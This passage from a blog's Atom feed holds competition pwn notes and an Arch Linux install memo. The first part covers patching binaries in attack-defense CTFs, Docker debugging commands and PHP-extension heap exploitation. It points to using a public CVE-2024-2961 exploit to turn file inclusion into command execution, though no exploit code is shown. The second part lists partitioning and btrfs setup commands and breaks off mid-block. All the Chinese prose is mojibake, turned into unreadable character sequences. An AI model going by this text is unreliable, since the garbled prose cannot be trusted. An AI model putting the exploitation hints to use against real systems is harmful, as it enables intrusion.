id="é€»è¾‘æ¼æ´">é€»è¾‘æ¼æ´</h2><p>nopæ¼æ´åˆ†æ”¯ï¼ˆnopæ‰è·³è½¬æŒ‡ä»¤ï¼‰æ•æ„Ÿå‡½æ•°çš„å‚æ•°æƒé™ï¼ˆå¦‚mmapç­‰ï¼‰</p><h2 id="é€šé˜²">é€šé˜²</h2><p>ç»™ç¨‹åºåŠ æ²™ç®±ç›´æ¥æ— è„‘å…³é—­execveè°ƒç”¨ï¼Œä½†æ˜¯é€šé˜²å¯èƒ½è¢«æ£€æµ‹ï¼Œè‡ªè¡Œæ–Ÿé…Œ<br><a href="https://github.com/TTY-flag/evilPatcher">https://github.com/TTY-flag/evilPatcher</a></p><p>æµ‹è¯•ä¸‹æ¥ï¼ŒäºŒè¿›åˆ¶æ–‡ä»¶å¤§å°æ²¡æœ‰å˜åŒ–ï¼Œçº¿ä¸‹è¯•è¯•å§ã€‚</p><p>æˆ–è€…è¿˜æœ‰ä¸€æ‹›ï¼Œå¦‚æœç¨‹åºè®¾ç½®äº†alarm(xx)çš„è¯ï¼ˆä¸€èˆ¬ä¼šæœ‰alarm(60)ï¼‰è¿™ç§é™åˆ¶æ—¶é—´çš„ï¼Œæµ‹è¯•ä¸‹ä¹‹åæŠŠå®ƒæ”¹çš„å¾ˆå°è®©expåˆ©ç”¨ä¸å®Œï¼Œä¹Ÿèƒ½è¡Œã€‚</p><h2 id="éé¢„æœŸï¼Ÿ">éé¢„æœŸï¼Ÿ</h2><p>ç¨‹åºå¦‚æœexité€€å‡ºï¼Œæ‰“ioçš„è¯å°è¯•nopæ‰exitæˆ–è€…æ”¹æˆ_exitï¼Ÿ</p><h1>æ£€æŸ¥æ¼æ´</h1><p>æ•æ„ŸåŠŸèƒ½å‡½æ•°ï¼Œstrlenè·å–é•¿åº¦é™åˆ¶èƒ½ä¸èƒ½å¡æ»¡æº¢å‡ºï¼Œscanf%sçš„è¾“å…¥</p><h1>dockerå‘½ä»¤</h1><p>pwnè°ƒè¯•</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">docker run -it -d -v host_path:container_path -p host_port:container_port --cap-add=SYS_PTRACE IMAGE_ID # auto update è‡ªåŠ¨æ‰§è¡Œupdate.shè„šæœ¬</span><br><span class="line"></span><br><span class="line">docker run -it -d -v host_path:container_path -p host_port:container_port --cap-add=SYS_PTRACE IMAGE_ID /bin/sh # do not update ä¸ä¼šè‡ªåŠ¨æ›´æ–°</span><br><span class="line"></span><br><span class="line">docker run -it -d -v host_path:container_path -p host_port:container_port --privileged IMAGE_ID # privileged enabled and auto update ç»™ç‰¹æƒæ ‡å¿—å’Œè‡ªåŠ¨æ›´æ–°</span><br><span class="line"></span><br><span class="line">docker run -it -d -v host_path:container_path -p host_port:container_port --privileged IMAGE_ID /bin/sh # privileged enabled and auto update ç»™ç‰¹æƒæ ‡å¿—å’Œè‡ªåŠ¨æ›´æ–°</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">docker run -it -d -v $PWD:/home/ctf/hacker</span><br><span class="line"></span><br><span class="line">docker exec -it CONTAINER_ID /bin/sh</span><br><span class="line">docker exec -it -u root CONTAINER_ID /bin/sh</span><br><span class="line"></span><br><span class="line">/bin/test-this-container.sh</span><br></pre></td></tr></table></figure><p>ç”¨å®˜æ–¹é•œåƒå¯åŠ¨æœ¬åœ°ç¯å¢ƒï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker load -i xxx.tar</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker ps -a --no-trunc è¾“å‡ºæ‰€æœ‰å‘½ä»¤</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1>PHP PWN???</h1><blockquote><p>2025.3.17: äº‹å®ä¸Šæ ¹æœ¬å°±æ²¡å·¥å¤«çœ‹è¿™é¢˜â€¦</p></blockquote><p>èµ›å‰å‘çš„é™„ä»¶åå­—å«php-masteræ€€ç–‘è¦å‡ºphp-pwnäº†ï¼Œæœäº†ä¸‹ç»“æœè¿˜æŒºå¸¸è§çš„ä½†æ˜¯éƒ½æ²¡åšè¿‡ï¼Œéº»ã€‚å…ˆé€Ÿé€šä¸€ä¸‹fixï¼Ÿ</p><p>PHP pwnçš„æ ¸å¿ƒæ˜¯ä¸€ä¸ªCç¼–å†™çš„æ‰©å±•åŠ¨æ€åº“ï¼Œä¸ºphpæä¾›ä¸€äº›å¯ç”¨çš„å‡½æ•°ã€‚</p><h2 id="ç¯å¢ƒæ­å»º">ç¯å¢ƒæ­å»º</h2><p>phpçš„ç‰ˆæœ¬ä¹Ÿæ¯”è¾ƒå¤šï¼Œå‡†å¤‡8.1-8.3çš„dockerå’Œæœ¬æœºçš„8.4.4ï¼Œä»¥åŠ7.4å¤‡ç”¨</p><p>å®é™…æ“ä½œæ—¶ï¼Œå»å¯¹åº”dockerä¸‹å°†/usr/srcçš„æºç è§£å‹ã€‚æ‰¾åˆ°æºç ç›®å½•çš„extï¼Œext_skel.phpï¼Œè¿™ä¸ªè„šæœ¬å¯ä»¥è‡ªåŠ¨ç”Ÿæˆä¸€å¥—æ‰©å±•ç”¨çš„åŸºç¡€æ–‡ä»¶</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">åˆ›å»ºå®¹å™¨: docker run -itd --name php -p 80:80 -v /Users/xiaosheng/docker:/var/www/html -v /Users/xiaosheng/docker/etc:/usr/local/etc -v /Users/xiaosheng/docker/conf:/etc/apache2/sites-enabled php:apache-buster</span><br><span class="line">å‘½ä»¤è¯¦è§£:</span><br><span class="line">--name php: php è¡¨ç¤ºåˆ›å»ºå‡ºæ¥çš„é•œåƒåç§°</span><br><span class="line">-p 80:80: è¡¨ç¤ºæœ¬æœºçš„ 80 ç«¯å£æ˜ å°„åˆ°å®¹å™¨å†…çš„ 80 ç«¯å£, å…¶ä¸­ç¬¬ä¸€ä¸ª 80 æ˜¯æœ¬æœºçš„</span><br><span class="line">-v /Users/xiaosheng/docker:/var/www/html: æ•°æ®å·æŒ‚è½½, å°†æœ¬æœºçš„ä»£ç æ–‡ä»¶å¤¹æ˜ å°„åˆ°å®¹å™¨å†…çš„ä»£ç æ–‡ä»¶å¤¹, å†’å·å‰é¢çš„æ˜¯æœ¬æœºçš„æ–‡ä»¶å¤¹åœ°å€</span><br><span class="line">-v /Users/xiaosheng/docker/etc:/usr/local/etc: å°†å®¹å™¨å†… PHP çš„é…ç½®æ–‡ä»¶æ˜ å°„åˆ°æœ¬æœº, è¿™æ ·æ–¹ä¾¿ä¿®æ”¹é…ç½®æ–‡ä»¶, å†’å·å‰é¢çš„æ˜¯æœ¬åœ°çš„æ–‡ä»¶å¤¹åœ°å€</span><br><span class="line">-v /Users/xiaosheng/docker/conf:/etc/apache2/sites-enabled: å°†å®¹å™¨å†… Apache ç«™ç‚¹çš„é…ç½®æ–‡ä»¶æ˜ å°„åˆ°æœ¬åœ°, æ–¹ä¾¿æ·»åŠ å’Œä¿®æ”¹ç«™ç‚¹é…ç½®æ–‡ä»¶, å†’å·å‰é¢çš„æ˜¯æœ¬åœ°çš„æ–‡ä»¶å¤¹åœ°å€</span><br><span class="line">php:apache-buster: è¡¨ç¤ºçš„æ˜¯ä½¿ç”¨å“ªä¸ªé•œåƒæ¥åˆ›å»ºå®¹å™¨, å³ é•œåƒåç§°:tagåç§°ã€</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">å®¹å™¨ä¸­ PHP æ²¡æœ‰ MySQL çš„æ‰©å±•, æ‰€ä»¥éœ€è¦è‡ªå·±æ‰‹åŠ¨ä¸‹è½½, ä¸‹è½½æ­¥éª¤å¯ä»¥å‚è€ƒè¯¥é“¾æ¥ https://www.yoyoask.com/?p=122</span><br><span class="line">docker-php-source : åœ¨ /usr/src ç›®å½•ä¸‹åˆ›å»ºå‡ºæ¥ php æ–‡ä»¶å¤¹</span><br><span class="line">è¿›å…¥ /usr/src/php/ext æ–‡ä»¶å¤¹, ä½¿ç”¨ docker-php-ext-install å®‰è£…æ‰€éœ€è¦çš„æ‰©å±•, å¦‚å®‰è£… pdo-mysql æ‰©å±•, å¯ä»¥ä½¿ç”¨ docker-php-ext-install pdo_mysql æ¥å®‰è£…</span><br><span class="line">ä¿®æ”¹ PHP çš„é…ç½®æ–‡ä»¶</span><br><span class="line">å»æ‰ ;extension=pdo_mysql å‰é¢çš„ ;</span><br><span class="line">ä½¿ç”¨ docker restart å®¹å™¨ID æ¥é‡å¯å®¹å™¨</span><br></pre></td></tr></table></figure><p>phpçš„æ ¸å¿ƒé…ç½®æ–‡ä»¶åœ¨php.ini æ‰§è¡Œ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php --ini</span><br></pre></td></tr></table></figure><p>å‘½ä»¤æ¥è¾“å‡ºæ‰€æœ‰çš„é…ç½®æ–‡ä»¶ä½ç½®</p><h2 id="æ€è·¯">æ€è·¯</h2><p>é¦–å…ˆï¼Œç›´æ¥è¯»/proc/self/mapæ¥æ‹¿åœ°å€ï¼Œä¸å¤šbb</p><p>ç„¶åphpå †ç±»ä¼¼äºlinuxå†…æ ¸çš„slabï¼Œæ²¡æœ‰å¤æ‚çš„metadataï¼Œè€Œæ˜¯é€šé€šç”¨bucketç®¡ç†ï¼Œç©ºé—²é“¾è¡¨ä¹Ÿæ˜¯ç±»ä¼¼tcacheç›´æ¥fdè¿æ¥æœ‰UAFçš„è¯éšä¾¿æ”¹ã€‚</p><p>fixçš„è¯å¯ä»¥è€ƒè™‘nopæ‰efree</p><h2 id="é€†å‘ç»“æ„ä½“">é€†å‘ç»“æ„ä½“</h2><p>module_entry:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">struct  _zend_module_entry &#123;</span><br><span class="line">                        unsigned short size;</span><br><span class="line">unsigned int zend_api;</span><br><span class="line">unsigned char zend_debug;</span><br><span class="line">unsigned char zts;</span><br><span class="line">void *ini_entry;</span><br><span class="line">void *deps;</span><br><span class="line">const char *name;</span><br><span class="line">void* functions;</span><br><span class="line">void* module_start_up_func</span><br><span class="line">void* module_shutdown_func;</span><br><span class="line">void* request_startup_func;</span><br><span class="line">void* request_shutdown_func;</span><br><span class="line">void *info_func;</span><br><span class="line">const char *version;</span><br><span class="line">size_t globals_size;</span><br><span class="line">void* globals_id_ptr;</span><br><span class="line">void* globals_ptr;</span><br><span class="line">void* globals_ctor;</span><br><span class="line">void* globals_dtor;</span><br><span class="line">void* post_deactivate_func;</span><br><span class="line">int module_started;</span><br><span class="line">unsigned char type;</span><br><span class="line">void* handle;</span><br><span class="line">int module_number;</span><br><span class="line">const char *build_id;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>6:str<br>7:arr<br>4:int?</p><h2 id="patch">patch</h2><p>off by null(D^3CTF 2024 pwnshell)</p><h2 id="éé¢„æœŸ">éé¢„æœŸ</h2><p>cve-2024-2961ï¼Œå€ŸåŠ©libcçš„æº¢å‡ºä»æ–‡ä»¶åŒ…å«æå‡è‡³å‘½ä»¤æ‰§è¡Œã€‚ç°æˆexpç¯å¢ƒé…å¥½äº†ï¼Œæœåˆ°çš„å»å¹´å†³èµ›pwnçš„awdpä¸­phpå¯ä»¥ç”¨è¿™ä¸ªä¸€é”®æ‰“é€šï¼Œä¸‡ä¸€å‘¢</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1&gt;ç¯å¢ƒé—®é¢˜&lt;/h1&gt;
&lt;p&gt;é¦–å…ˆï¼Œæˆ‘æœ‰ä¸¤å¥—ç¯å¢ƒã€‚ä¸€ä¸ªwindowsä¸€ä¸ªarchï¼Œéƒ½æ˜¯ç‰©ç†æœºã€‚&lt;/p&gt;
&lt;p&gt;å…¶ä¸­ï¼Œwindowsä¸Šæ‹¥æœ‰kali-wslå’Œwin_penetration_toolkit-vmwareï¼Œå¹³å¸¸çš„pwné¢˜æ˜¯é‡‡ç”¨&lt;/p&gt;
&lt;ul class=&quot;lvl-</summary>
      
    
    
    
    <category term="pwn" scheme="https://zjw1nd.github.io/categories/pwn/"/>
    
    
    <category term="awdp" scheme="https://zjw1nd.github.io/tags/awdp/"/>
    
    <category term="pwn" scheme="https://zjw1nd.github.io/tags/pwn/"/>
    
    <category term="awd" scheme="https://zjw1nd.github.io/tags/awd/"/>
    
    <category term="php" scheme="https://zjw1nd.github.io/tags/php/"/>
    
  </entry>
  
  <entry>
    <title>Archå®‰è£…å¤‡å¿˜æ‰‹å†Œ</title>
    <link href="https://zjw1nd.github.io/2025/02/24/Arch%E5%AE%89%E8%A3%85%E5%A4%87%E5%BF%98%E6%89%8B%E5%86%8C/"/>
    <id>https://zjw1nd.github.io/2025/02/24/Arch%E5%AE%89%E8%A3%85%E5%A4%87%E5%BF%98%E6%89%8B%E5%86%8C/</id>
    <published>2025-02-24T08:30:11.000Z</published>
    <updated>2025-03-11T12:44:09.964Z</updated>
    
    <content type="html"><![CDATA[<p><strong>é¦–å…ˆçš„é¦–å…ˆï¼Œæœ€é‡è¦çš„å‚è€ƒæ¥è‡ªäº<a href="https://arch.icekylin.online/guide/rookie/pre-install.html">archlinuxç®€æ˜æŒ‡å—</a></strong>ã€‚</p><h1>å†™åœ¨å‰é¢</h1><p>è¿™ç¯‡æ–‡ç« çš„ç›®çš„æ˜¯æ•´é½ï¼Œç®€æ˜åœ°å½’çº³ç¬”è€…è‡ªå·±æ—¥å¸¸linuxæ‰€æ¥è§¦åˆ°çš„ä¸€äº›ç»éªŒï¼Œå…å¾—åœ¨æœç´¢å¼•æ“å±é‡Œæ·˜é‡‘ã€‚ä½†æ˜¯ä½œè€…æœ¬äººçš„è®°æ€§å¾ˆä¸å¥½ï¼Œæ‰€ä»¥å¯èƒ½æœ‰æ‰€ç¼ºç–ã€‚ç‰¹åˆ«åœ°ï¼Œæœ¬æ–‡å°¤å…¶é’ˆå¯¹çš„æ˜¯<code>ArchLinux</code>è¿™ä¸€å‘è¡Œç‰ˆã€‚</p><h1>ä½ æ˜¯å¦éœ€è¦ä»0å¼€å§‹å®‰è£…ä¸€ä¸ªåŸºæœ¬ç³»ç»Ÿï¼Ÿ</h1><p>ç›´æ¥å‚è€ƒ<a href="https://arch.icekylin.online/guide/rookie/pre-install.html">archlinuxç®€æ˜æŒ‡å—</a>ï¼Œæ­£å¦‚æŒ‡å—ä¸­å¼ºè°ƒçš„ï¼Œä¸è¦è¯•å›¾æ›´æ”¹ä¸€äº›æŒ‡å—ä¸­æä¾›çš„è®¾ç½®ï¼Œé™¤éä½ <strong>çœŸçš„çœŸçš„å®Œå…¨çŸ¥é“</strong>è‡ªå·±åœ¨åšä»€ä¹ˆã€‚è¿™éƒ¨åˆ†çš„ç»éªŒå¯¹äºæ‰€æœ‰æ“ä½œç³»ç»Ÿåº”å½“éƒ½æ˜¯ç±»ä¼¼çš„ã€‚</p><p>ç®€å•æ¥è¯´å°±æ˜¯ï¼š</p><ul class="lvl-0"><li class="lvl-2"><p>åŒæ­¥æ—¶é—´ï¼Œè”ç½‘ï¼Œæ¢æº</p></li><li class="lvl-2"><p>åˆ†åŒºå’Œæ ¼å¼åŒ–ï¼Œefiï¼Œäº¤æ¢åˆ†åŒºå’Œä¸»åˆ†åŒºï¼ˆbtrfsï¼‰</p></li><li class="lvl-2"><p>æŒ‚è½½å¹¶å®‰è£…ç³»ç»Ÿï¼Œè®¾ç½®åŸºæœ¬ä¿¡æ¯å¦‚æ—¶åŒºï¼Œç”¨æˆ·åå¯†ç </p></li><li class="lvl-2"><p>å®‰è£…å¼•å¯¼ç¨‹åºå’Œå…¶ä»–å¿…é¡»ç»„ä»¶</p></li></ul><p>ç”±äºpacmançš„å¼ºå¤§ï¼Œè¿‡ç¨‹å¹¶ä¸å›°éš¾</p><h2 id="btrfs">btrfs</h2><blockquote><p>åŒæ ·ï¼Œå¯ä»¥é˜…è¯»archlinuxç®€æ˜æŒ‡å—ä¸Šçš„<a href="https://arch.icekylin.online/guide/advanced/btrfs.html">ä»‹ç»</a>ä¸è¦å®‰è£…ä¼ ç»Ÿçš„ext4 linuxæ–‡ä»¶ç³»ç»Ÿï¼Œä½¿ç”¨æ›´å¥½çš„btrfsã€‚æˆ‘ä»¬ä¸å…³å¿ƒå…·ä½“æ€ä¹ˆå®ç°çš„ï¼ŒåªçŸ¥é“è¿™æ˜¯ä¸€ä¸ªæä¾›äº†å¾ˆå¤šå¾ˆå¥½ç‰¹æ€§çš„æ–‡ä»¶ç³»ç»Ÿå³å¯ã€‚</p></blockquote><p>å°¤å…¶æ˜¯å¯¹äºï¼š</p><ul class="lvl-0"><li class="lvl-2"><p>SSDçš„å¤§å¹…ä¼˜åŒ–ï¼ŒåŒ…æ‹¬å†™æ—¶å¤åˆ¶å’Œé€æ˜å‹ç¼©ç‰¹æ€§</p></li><li class="lvl-2"><p>å­å·å’Œå…‹éš†ç‰¹æ€§è®©å…¶æ”¯æŒéå¸¸æ–¹ä¾¿çš„å¿«ç…§ï¼ˆç”šè‡³æ˜¯å¿«ç…§çš„å¿«ç…§ï¼‰</p></li></ul><p>å…¶ä¸­ï¼Œåè€…ç‰¹æ€§å¯¹äºarchlinuxæ˜¯éå¸¸é‡è¦çš„ï¼Œå› ä¸ºarchä¸åœåœ°åœ¨æ»šåŠ¨æ›´æ–°ï¼Œæˆ‘ä»¬æŠ˜è…¾çš„æ—¶å€™ä¼šéå¸¸æœ‰å¸®åŠ©ã€‚é‡‡ç”¨ç¥å¥‡çš„btrfsåï¼Œæˆ‘ä»¬çš„ç³»ç»Ÿå°±èƒ½ç”¨<strong>æå…¶</strong>å°çš„ç©ºé—´è¿›è¡Œå¢é‡å¿«ç…§å¤‡ä»½ã€‚ï¼ˆè€Œç›¸å¯¹çš„ï¼Œä½¿ç”¨ext4ç¬¦åˆæˆ‘ä»¬çš„ç›´è§‰â€”â€”å¿«ç…§éœ€è¦æ‹·è´æ•´ä¸ªç£ç›˜ï¼‰</p><h2 id="è¿™ä¸€éƒ¨åˆ†çš„å¿«é€Ÿå‘½ä»¤æŒ‡å—ï¼š">è¿™ä¸€éƒ¨åˆ†çš„å¿«é€Ÿå‘½ä»¤æŒ‡å—ï¼š</h2><p>LiveCDä½¿ç”¨windowsä¸‹çš„rufusåˆ¶ä½œã€‚ä¸‹é¢æˆ‘ä¼šåˆ—å‡ºarchlinuxç®€æ˜æŒ‡å—ä¸Šæ‰€æœ‰ç›¸å…³çš„å‘½ä»¤å’Œä½œç”¨ã€‚è¿™ä¸€éƒ¨åˆ†å‡è®¾ä¸ä¼šé‡åˆ°ä»»ä½•çš„é—®é¢˜å’ŒæŠ¥é”™ã€‚</p><blockquote><p>LiveCDç¯å¢ƒä¸‹:</p></blockquote><h3 id="åŒæ­¥æ—¶é—´ï¼Œè”ç½‘ï¼Œæ¢æº">åŒæ­¥æ—¶é—´ï¼Œè”ç½‘ï¼Œæ¢æº</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">#-- ç¦ç”¨é•œåƒå†…çš„è‡ªåŠ¨æ›´æ–°æºæœåŠ¡ï¼Œäººåœ¨å›½å¤–çš„å°±æ— æ‰€è°“äº†</span><br><span class="line">systemctl stop reflector.service</span><br><span class="line"># æ£€æŸ¥çŠ¶æ€</span><br><span class="line">systemctl status reflector.service</span><br><span class="line"></span><br><span class="line">#-- æ— çº¿è¿æ¥ç½‘ç»œï¼Œæœ‰çº¿åº”å½“è‡ªåŠ¨è¿æ¥</span><br><span class="line">iwctl # è¿›å…¥äº¤äº’å¼å‘½ä»¤è¡Œ</span><br><span class="line">device list # åˆ—å‡ºæ— çº¿ç½‘å¡è®¾å¤‡åï¼Œæ¯”å¦‚æ— çº¿ç½‘å¡çœ‹åˆ°å« wlan0</span><br><span class="line">station wlan0 scan # æ‰«æç½‘ç»œ</span><br><span class="line">station wlan0 get-networks # åˆ—å‡ºæ‰€æœ‰ wifi ç½‘ç»œ</span><br><span class="line">station wlan0 connect wifi-name # è¿›è¡Œè¿æ¥ï¼Œæ³¨æ„è¿™é‡Œæ— æ³•è¾“å…¥ä¸­æ–‡ã€‚å›è½¦åè¾“å…¥å¯†ç å³å¯</span><br><span class="line">exit # è¿æ¥æˆåŠŸåé€€å‡º</span><br><span class="line"></span><br><span class="line">#-- æ›´æ–°æ—¶é’Ÿ</span><br><span class="line">timedatectl set-ntp true</span><br><span class="line"># æ£€æŸ¥</span><br><span class="line">timedatectl status</span><br><span class="line"></span><br><span class="line">#--æ¢æº</span><br><span class="line">vim /etc/pacman.d/mirrorlist</span><br><span class="line"># æ·»åŠ å›½å†…æºï¼Œå¦‚æœè‡ªå·±çš„å­¦æ ¡æœ‰ä¼˜å…ˆç”¨è‡ªå·±çš„ï¼Œæ”¾åœ¨æœ€ä¸Šé¢</span><br><span class="line"># ä¸è¦åœ¨è¿™ä¸€æ­¥æ·»åŠ archlinuxcn</span><br><span class="line">Server = https://mirrors.hust.edu.cn/archlinux/$repo/os/$arch # åç§‘çš„</span><br><span class="line">Server = https://mirrors.ustc.edu.cn/archlinux/$repo/os/$arch # ä¸­å›½ç§‘å­¦æŠ€æœ¯å¤§å­¦å¼€æºé•œåƒç«™</span><br><span class="line">Server = https://mirrors.tuna.tsinghua.edu.cn/archlinux/$repo/os/$arch # æ¸…åå¤§å­¦å¼€æºè½¯ä»¶é•œåƒç«™</span><br><span class="line">Server = https://repo.huaweicloud.com/archlinux/$repo/os/$arch # åä¸ºå¼€æºé•œåƒç«™</span><br><span class="line">Server = http://mirror.lzu.edu.cn/archlinux/$repo/os/$arch # å…°å·å¤§å­¦å¼€æºé•œåƒç«™</span><br></pre></td></tr></table></figure><h3 id="åˆ†åŒºå’Œæ ¼å¼åŒ–">åˆ†åŒºå’Œæ ¼å¼åŒ–</h3><p>é‡åˆ°çš„é—®é¢˜æˆ–æƒ³ä½¿ç”¨ext4åˆ†åŒºè¯·å‚è€ƒ<a href="https://arch.icekylin.online/guide/rookie/basic-install-detail.html">ArchLinuxç®€æ˜æŒ‡å—</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">lsblk # æŸ¥çœ‹è®¾å¤‡</span><br><span class="line">cfdisk /dev/sd_ </span><br></pre></td></tr></table></figure><p><font color=lightyellow>æ³¨æ„âš ï¸ï¼Œcfdiskå¯¹äºå¤§å°çš„è®¾ç½®æ˜¯Må’ŒGè€Œä¸æ˜¯Mbå’ŒGbï¼Œè¾“å…¥Mbå’ŒGbä¹Ÿèƒ½è¯†åˆ«ä½†å¤§å°ä¼šæœ‰è¯¯ï¼ŒåŠ¡å¿…æ£€æŸ¥</font></p><p>cfdiskçš„ç•Œé¢å®Œå…¨æ˜¯å¯è¯»çš„ã€‚å‚è€ƒç®€æ˜æŒ‡å—å³å¯ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># æ£€æŸ¥</span><br><span class="line">fdisk -l</span><br></pre></td></tr></table></figure><p>æ ¼å¼åŒ–æ“ä½œå¦‚ä¸‹ï¼Œå¦‚æœå’Œwindowså…±å­˜åˆ™ä¸è¦æ ¼å¼åŒ–efiåˆ†åŒºï¼Œä»¥ä¸‹æ“ä½œéƒ½æ˜¯å¯¹<strong>æ–°</strong>ç©ºé—´æ“ä½œçš„ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#efi</span><br><span class="line">mkfs.fat -F32 /dev/sdxn #sata</span><br><span class="line">mkfs.fat -F32 /dev/nvmexn1pn # nvme</span><br><span class="line"></span><br><span class="line">mkswap /dev/sdxn #swap</span><br><span class="line"></span><br><span class="line">mkfs.btrfs -L MyArch /dev/sdxn #btrfs,-Læ˜¯åå­—-labelï¼Œæ— ç‰¹æ®Šå­—ç¬¦å’Œç©ºæ ¼</span><br></pre></td></tr></table></figure><p>è®¾ç½®btrfs</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">mount -t btrfs -o compress=zstd /dev/sdxn /mnt #æŒ‚è½½</span><br><span class="line"># è¿™æ˜¯ä¸ºäº†ä½¿ç”¨timeshiftåšå‡†å¤‡ï¼Œè¯·å°½å¯èƒ½ä¸¥æ ¼æŒ‰ç…§è¿™ä¸ªåˆ†åŒºå‘½åå’Œè®¾ç½®</span><br><span class="line">btrfs subvolume create /mnt/@ # åˆ›å»º / ç›®å½•å­å·</span><br><span class="line">btrfs subvolume create /mnt/@home # åˆ›å»º /home ç›®å½•å­å·</span><br><span class="line">btrfs subvolume list -p /mnt #æ£€æŸ¥</span><br><span class="line">umount /mnt</span><br><span class="line"># æŒ‚è½½ç³»ç»Ÿ</span><br><span class="line">mount -t btrfs -o subvol=/@,compress=zstd /dev/sdxn /mnt # æŒ‚è½½ / ç›®å½•</span><br><span class="line">mkdir /mnt/home # åˆ›å»º /home ç›®å½•</span><br><span class="line">mount -t btrfs -o subvol=/@home,compress=zstd /dev/sdxn /mnt/home # æŒ‚è½½ /home ç›®å½•</span><br><span class="line">mkdir -p /mnt/boot # åˆ›å»º /boot ç›®å½•</span><br><span class="line">mount /dev/sdxn /mnt/boot # æŒ‚è½½ /boot ç›®å½•</span><br><span class="line">swapon /dev/sdxn # æŒ‚è½½äº¤æ¢åˆ†åŒº</span><br></pre></td></tr></table></figure><h3 id="å®‰è£…ç³»ç»Ÿ">å®‰è£…ç³»ç»Ÿ</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">pacstrap /mnt base base-devel linux linux-firmware btrfs-progs</span><br><span class="line"># å¦‚æœä½¿ç”¨btrfsæ–‡ä»¶ç³»ç»Ÿï¼Œé¢å¤–å®‰è£…ä¸€ä¸ªbtrfs-progsåŒ…</span><br><span class="line">pacstrap /mnt networkmanager vim sudo zsh zsh-completions # å…¶å®bashä¹Ÿè¡Œ</span><br><span class="line"></span><br><span class="line">genfstab -U /mnt &gt; /mnt/etc/fstab</span><br><span class="line">cat /mnt/etc/fstab # æ£€æŸ¥</span><br><span class="line"></span><br><span class="line">arch-chroot /mnt # åˆ‡æ¢</span><br></pre></td></tr></table></figure><blockquote><p>ğŸ’¡Tips: æ³¨æ„ï¼Œåœ¨æˆ‘ä»¬çš„ç³»ç»Ÿæ— æ³•å¯åŠ¨ä»€ä¹ˆä¹Ÿåšä¸äº†çš„æ—¶å€™ï¼ŒåŒæ ·å¯ä»¥ç”¨livecdçš„è¿™ä¸ªå‘½ä»¤æ£€æŸ¥ä¿®å¤</p></blockquote><p>ä»è¿™ä¸€æ­¥åï¼Œæˆ‘ä»¬å°±è¿›å…¥äº†çœŸæ­£çš„ç³»ç»Ÿ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/hostname # 